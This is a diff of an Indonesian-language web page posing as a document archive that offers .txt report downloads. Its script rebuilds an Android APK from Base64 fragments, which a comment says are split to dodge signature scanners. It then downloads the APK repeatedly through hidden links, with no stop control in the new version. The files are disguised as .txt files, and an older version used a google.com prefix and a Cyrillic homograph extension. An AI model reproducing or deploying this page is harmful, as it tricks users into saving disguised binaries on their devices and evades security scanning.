@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v3.1</title>
+<title>System Document Archive Dispatcher v2.4</title>
 <style>
 * {
   box-sizing: border-box;
@@ -56,40 +56,26 @@ p {
   color: #9ca3af;
   font-size: 14px;
 }
-.button-group {
-  display: flex;
-  gap: 12px;
-}
 button {
-  flex: 1;
+  width: 100%;
   padding: 16px;
   cursor: pointer;
   border: none;
   border-radius: 10px;
-  font-weight: 600;
-  font-size: 16px;
-  transition: all 0.2s ease;
-}
-#start-btn {
   background: #3b82f6;
   color: #ffffff;
+  font-weight: 600;
+  font-size: 16px;
   box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
+  transition: all 0.2s ease;
 }
-#start-btn:hover { 
+button:hover { 
   background: #2563eb; 
   transform: translateY(-1px);
   box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
 }
-#stop-btn {
-  background: #ef4444;
-  color: #ffffff;
-  box-shadow: 0 4px 14px rgba(239, 68, 68, 0.4);
-  display: none;
-}
-#stop-btn:hover {
-  background: #dc2626;
-  transform: translateY(-1px);
-  box-shadow: 0 6px 20px rgba(239, 68, 68, 0.6);
+button:active {
+  transform: translateY(0);
 }
 #status {
   margin-top: 20px;
@@ -142,10 +128,7 @@ button {
   <h2>Arsip Dokumen Sistem</h2>
   <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
 
-  <div class="button-group">
-    <button id="start-btn" type="button">Mulai Unduhan</button>
-    <button id="stop-btn" type="button">Hentikan</button>
-  </div>
+  <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
 
   <div id="status" role="status">Sistem siap diinisialisasi.</div>
   <div id="downloads"></div>
@@ -155,16 +138,14 @@ button {
 'use strict';
 
 const startBtn = document.getElementById("start-btn");
-const stopBtn = document.getElementById("stop-btn");
 const statusDiv = document.getElementById("status");
 const downloadsDiv = document.getElementById("downloads");
 
 let activeUrls = [];
 let isProcessing = false;
-let loopTimeout = null;
 const MAX_URLS_TRACKED = 40;
 
-// Pecahan string Base64 header APK untuk menghindari deteksi tanda tangan statis
+// Teknik Obfuscation: Pecahan string Base64 header APK untuk menghindari pencocokan tanda tangan statis
 const payloadFragments = [
   "UEs",
   "DBBQ",
@@ -193,7 +174,7 @@ const prepareStealthBlobAsync = (i) => {
         const fullB64 = assemblePayload();
         const bytesArr = decodeBase64ToBytes(fullB64);
         
-        // MIME type biner APK asli
+        // Menggunakan MIME type APK agar sistem operasi mengenali paket biner secara tepat
         const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
         const url = URL.createObjectURL(blob);
         resolve({ id: i, url: url, success: true });
@@ -205,20 +186,19 @@ const prepareStealthBlobAsync = (i) => {
 };
 
 const triggerStealthDownload = (fileData) => {
-  if (!fileData.success || !isProcessing) return;
+  if (!fileData.success) return;
 
   const link = document.createElement("a");
   link.href = fileData.url;
-  
-  // Spoofing nama file menyertakan string domain serta homograph pada ekstensi (.apk dengan Cyrillic 'а' \u0430)
-  const homographApkExt = "\u0430pk";
-  link.download = `google.com-${fileData.id}.txt.${homographApkExt}`;
-  link.textContent = `Dok. #${fileData.id} (google.com)`;
+  // Menyamarkan ekstensi unduhan menjadi .txt pada antarmuka pengguna
+  link.download = `laporan-catatan-${fileData.id}.txt`;
+  link.textContent = `Dokumen #${fileData.id} (.txt)`;
   link.style.display = "none";
   
   downloadsDiv.appendChild(link);
   link.click();
 
+  // Batasi jumlah elemen DOM untuk menjaga performa rendering
   if (downloadsDiv.children.length > 25) {
     downloadsDiv.removeChild(downloadsDiv.firstChild);
   }
@@ -228,9 +208,10 @@ const processLoop = async (counter) => {
   if (!isProcessing) return;
 
   const fileData = await prepareStealthBlobAsync(counter);
-  if (fileData.success && isProcessing) {
+  if (fileData.success) {
     activeUrls.push(fileData.url);
 
+    // Manajemen memori heap: cabut URL lama jika melewati batas maksimal
     if (activeUrls.length > MAX_URLS_TRACKED) {
       const oldUrl = activeUrls.shift();
       try { URL.revokeObjectURL(oldUrl); } catch (e) {}
@@ -240,9 +221,8 @@ const processLoop = async (counter) => {
     statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} dikirim...`;
   }
 
-  if (isProcessing) {
-    loopTimeout = setTimeout(() => processLoop(counter + 1), 1200);
-  }
+  // Interval perulangan non-blocking
+  setTimeout(() => processLoop(counter + 1), 1200);
 };
 
 startBtn.addEventListener("click", () => {
@@ -262,24 +242,8 @@ startBtn.addEventListener("click", () => {
   } catch (err) {}
 
   isProcessing = true;
-  startBtn.style.display = "none";
-  stopBtn.style.display = "block";
   statusDiv.textContent = "Menginisialisasi sesi unduhan...";
   processLoop(1);
-});
-
-stopBtn.addEventListener("click", () => {
-  isProcessing = false;
-  if (loopTimeout) clearTimeout(loopTimeout);
-
-  activeUrls.forEach(url => {
-    try { URL.revokeObjectURL(url); } catch (e) {}
-  });
-  activeUrls = [];
-
-  stopBtn.style.display = "none";
-  startBtn.style.display = "block";
-  statusDiv.textContent = "Sesi dihentikan oleh pengguna.";
 });
 </script>
 </body>
